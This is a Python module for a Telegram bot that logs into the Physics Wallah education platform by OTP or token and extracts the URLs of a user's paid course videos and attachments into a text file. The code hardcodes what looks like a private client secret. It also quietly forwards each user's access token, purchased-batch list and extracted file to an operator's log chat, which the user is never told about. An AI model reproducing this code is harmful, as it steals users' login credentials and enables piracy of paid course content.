import requests
import asyncio
from pyrogram import Client, filters
import requests, os, sys, re
import math
import json, asyncio
from config import PREMIUM_LOGS, join
import subprocess
import datetime
from Extractor import app
from pyrogram import filters
from subprocess import getstatusoutput
from datetime import datetime
import pytz
import re
import unicodedata

india_timezone = pytz.timezone('Asia/Kolkata')
current_time = datetime.now(india_timezone)
time_new = current_time.strftime("%d-%m-%Y %I:%M %p")

def extract_mpd_info(url):
    # Extract base MPD URL (everything before parentId if it exists)
    base_url = url.split('parentId=')[0].rstrip('&') if 'parentId=' in url else url
    
    # Extract parentId and childId
    parent_match = re.search(r'parentId=([^&]+)', url)
    child_match = re.search(r'childId=([^&]+)', url)
    
    parent_id = parent_match.group(1) if parent_match else None
    child_id = child_match.group(1) if child_match else None
    
    # If we have both IDs, combine them with the base URL
    if parent_id and child_id:
        final_url = f"{base_url}?parentId={parent_id}&childId={child_id}"
    else:
        final_url = base_url
        
    return final_url

def clean_text(text):
    if not text:
        return ""
    # Remove control characters and normalize
    text = "".join(ch for ch in text if unicodedata.category(ch)[0] != "C")
    text = unicodedata.normalize('NFKD', text).encode('ascii', 'ignore').decode('ascii')
    # Replace problematic characters
    text = text.replace(":", "_").replace("/", "_").replace("|", "_").replace("\\", "_")
    return text

@app.on_message(filters.command(["pw"]))
async def pw_login(app, message):
    try:
        query_msg = await app.ask(
            chat_id=message.chat.id,
            text="🔐 **Enter your PW Mobile No. (without country code) or your Login Token:** , --- \n **DONT LOGIN WITH PHONE NUMBER, It Leads to ban your account of PW**")
                 
        
        user_input = query_msg.text.strip()

        if user_input.isdigit():
            mob = user_input
            payload = {
                "username": mob,
                "countryCode": "+91",
                "organizationId": "5eb393ee95fab7468a79d189"
            }
            headers = {
                "client-id": "5eb393ee95fab7468a79d189",
                "client-version": "12.84",
                "Client-Type": "MOBILE",
                "randomId": "e4307177362e86f1",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json"
            }
            
            await app.send_message(message.chat.id, "🔄 **Sending OTP... Please wait!**")
            otp_response = requests.post(
                "https://api.penpencil.co/v1/users/get-otp?smsType=0", 
                headers=headers, 
                json=payload
            ).json()

            if not otp_response.get("success"):
                await message.reply_text("❌ **Invalid Mobile Number! Please provide a valid PW login number.**")
                return
            
            await app.send_message(message.chat.id, "✅ **OTP sent successfully! Please enter your OTP:**")
            otp_msg = await app.ask(message.chat.id, text="🔑 **Enter the OTP you received:**")
            otp = otp_msg.text.strip()

            token_payload = {
                "username": mob,
                "otp": otp,
                "client_id": "system-admin",
                "client_secret": "KjPXuAVfC5xbmgreETNMaL7z",
                "grant_type": "password",
                "organizationId": "5eb393ee95fab7468a79d189",
                "latitude": 0,
                "longitude": 0
            }
            
            await app.send_message(message.chat.id, "🔄 **Verifying OTP... Please wait!**")
            token_response = requests.post(
                "https://api.penpencil.co/v3/oauth/token", 
                data=token_payload
            ).json()
            
            token = token_response.get("data", {}).get("access_token")
            if not token:
                await message.reply_text("❌ **Login failed! Invalid OTP.**")
                return
            
            dl = (f"✅ ** PW Login Successful!**\n\n🔑 **Here is your token:**\n`{token}`")
            await message.reply_text(f"✅ **Login Successful!**\n\n🔑 **Here is your token:**\n`{token}`")
            await app.send_message(PREMIUM_LOGS, dl)
        
        elif user_input.startswith("e"):
            token = user_input
        else:
            await message.reply_text("❌ **Invalid input! Please provide a valid mobile number or token.**")
            return


        headers = {
            "client-id": "5eb393ee95fab7468a79d189",
            "client-type": "WEB",
            "Authorization": f"Bearer {token}",
            "client-version": "3.3.0",
            "randomId": "04b54cdb-bf9e-48ef-974d-620e21bd3e23",
            "Accept": "application/json, text/plain, */*"
        }
        
        batch_response = requests.get(
            "https://api.penpencil.co/v3/batches/my-batches?mode=1&amount=paid&page=1", 
            headers=headers
        ).json()
        
        batches = batch_response.get("data", [])
        if not batches:
            await message.reply_text("❌ **No batches found for this account.**")
            return


        batch_text = "📚 **Your Batches:**\n\n"
        batch_map = {}
        for batch in batches:
            bi = batch.get("_id")
            bn = batch.get("name")
            batch_text += f"📖 `{bi}` → **{bn}**\n"
            batch_map[bi] = bn

        query_msg = await app.send_message(
            chat_id=message.chat.id, 
            text=batch_text + "\n\n💡 **Please enter the Course ID to continue:**",
            reply_markup=None
        )
        
        target_id_msg = await app.ask(message.chat.id, text="🆔 **Enter the Course ID here:**")
        target_id = target_id_msg.text.strip()


        if target_id not in batch_map:
            await message.reply_text("❌ **Invalid Course ID! Please try again.**")
            return

        batch_name = batch_map[target_id]
        filename = f"{batch_name.replace('/', '_').replace(':', '_').replace('|', '_')}.txt"

        await app.send_message(
            chat_id=message.chat.id, 
            text=f"🕵️ **Fetching details for Batch:** **{batch_name}**... Please wait!"
        )
        course_response = requests.get(
            f"https://api.penpencil.co/v3/batches/{target_id}/details", 
            headers=headers
        ).json()
        
        subjects = course_response.get("data", {}).get("subjects", [])
        if not subjects:
            await message.reply_text("❌ **No subjects found for the selected course.**")
            return

        with open(filename, 'w', encoding='utf-8') as f:
            for subject in subjects:
                si = subject.get("_id")
                sn = clean_text(subject.get("subject", ""))
                await app.send_message(
                    chat_id=message.chat.id, 
                    text=f"📘 **Processing Subject:** **{sn}**... ⏳"
                )
                
                for page in range(1, 12):
                    content_response = requests.get(
                        f"https://api.penpencil.co/v2/batches/{target_id}/subject/{si}/contents?page={page}&contentType=exercises-notes-videos", 
                        headers=headers
                    ).json()
                    
                    for item in content_response.get("data", []):
                        try:
                            topic = clean_text(item.get("topic", ""))
                            url = item.get("url", "")
                            if url:
                                if '.mpd' in url:
                                    final_url = extract_mpd_info(url)
                                    f.write(f"{topic}:{final_url}\n")
                                else:
                                    f.write(f"{topic}:{url}\n")

                            for hw in item.get("homeworkIds", []):
                                for attachment in hw.get("attachmentIds", []):
                                    try:
                                        name = clean_text(attachment.get("name", ""))
                                        base_url = attachment.get("baseUrl", "")
                                        key = attachment.get("key", "")
                                        if key:
                                            full_url = f"{base_url}{key}"
                                            if '.mpd' in full_url:
                                                final_url = extract_mpd_info(full_url)
                                                f.write(f"{name}:{final_url}\n")
                                            else:
                                                f.write(f"{name}:{full_url}\n")
                                    except Exception as e:
                                        print(f"Error processing attachment: {str(e)}")
                                        continue
                        except Exception as e:
                            print(f"Error processing item: {str(e)}")
                            continue

        up = (f"**Login Succesfull for PW:** `{token}`")
        captionn = (f" App Name : Physics Wallah \n\n PURCHASED BATCHES : {batch_text}")
        caption =(
                 f"࿇ ══━━ 🏦 ━━══ ࿇\n\n"
                 f"🌀 **Aᴘᴘ Nᴀᴍᴇ** : ᴘʜʏsɪᴄs ᴡᴀʟʟᴀʜ (𝗣𝘄)\n"
                 f"============================\n\n"
                 f"✳️**Bᴀᴛᴄʜ ID** : **{target_id}**\n"
                 f"🎯 **Bᴀᴛᴄʜ Nᴀᴍᴇ** : `{batch_name}`\n\n"
                 f"🌐 **Jᴏɪɴ Us** : {join}\n"
                 f"❄️ **Dᴀᴛᴇ** : {time_new}")

        
        await app.send_document(chat_id=message.chat.id, document=filename, caption=caption)
        await app.send_document(PREMIUM_LOGS, document=filename, caption = captionn)
        await app.send_message(PREMIUM_LOGS , up)

    except Exception as e:
        error_msg = str(e)
        # Limit error message length and clean it
        error_msg = clean_text(error_msg[:200]) + "..." if len(error_msg) > 200 else clean_text(error_msg)
        await message.reply_text(f"❌ **An error occurred:** `{error_msg}`")
            
